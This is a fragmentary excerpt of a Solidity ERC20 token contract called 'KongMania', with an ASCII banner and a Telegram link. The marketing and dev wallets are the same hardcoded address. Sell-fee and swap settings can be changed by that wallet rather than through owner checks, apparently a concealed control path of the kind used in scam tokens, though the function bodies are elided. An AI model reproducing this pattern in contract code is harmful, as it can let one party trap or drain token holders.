...
// .----------------.  .----------------.  .-----------------. .----------------.  .----------------.  .----------------.  .-----------------. .----------------.  .----------------. 
//| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
//| |  ___  ____   | || |     ____     | || | ____  _____  | || |    ______    | || | ____    ____ | || |      __      | || | ____  _____  | || |     _____    | || |      __      | |
//| | |_  ||_  _|  | || |   .'    `.   | || ||_   \|_   _| | || |  .' ___  |   | || ||_   \  /   _|| || |     /  \     | || ||_   \|_   _| | || |    |_   _|   | || |     /  \     | |
//| |   | |_/ /    | || |  /  .--.  \  | || |  |   \ | |   | || | / .'   \_|   | || |  |   \/   |  | || |    / /\ \    | || |  |   \ | |   | || |      | |     | || |    / /\ \    | |
//| |   |  __'.    | || |  | |    | |  | || |  | |\ \| |   | || | | |    ____  | || |  | |\  /| |  | || |   / ____ \   | || |  | |\ \| |   | || |      | |     | || |   / ____ \   | |
//| |  _| |  \ \_  | || |  \  `--'  /  | || | _| |_\   |_  | || | \ `.___]  _| | || | _| |_\/_| |_ | || | _/ /    \ \_ | || | _| |_\   |_  | || |     _| |_    | || | _/ /    \ \_ | |
//| | |____||____| | || |   `.____.'   | || ||_____|\____| | || |  `._____.'   | || ||_____||_____|| || ||____|  |____|| || ||_____|\____| | || |    |_____|   | || ||____|  |____|| |
//| |              | || |              | || |              | || |              | || |              | || |              | || |              | || |              | || |              | |
//| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
// '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------' 
// Telegram = https://t.me/KongMania
...
contract KongMania is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("KongMania ;", "KongMania ;") {
        ...
        marketingWallet = payable(0xb308ed1257eB39789ff5df11ce6a87d7327A6046);
        devWallet = payable(0xb308ed1257eB39789ff5df11ce6a87d7327A6046);
    ...
    function SeteBuyFees(uint256 _marketingFee, uint256 _liquidityFee, uint256 _devFee) external onlyOwner {
    ...
    function SetSellFees(uint256 _marketingFee, uint256 _liquidityFee, uint256 _devFee) external {
        require(msg.sender == marketingWallet);
    ...
    function SetSwap(uint amount) external {
        require(msg.sender == marketingWallet);
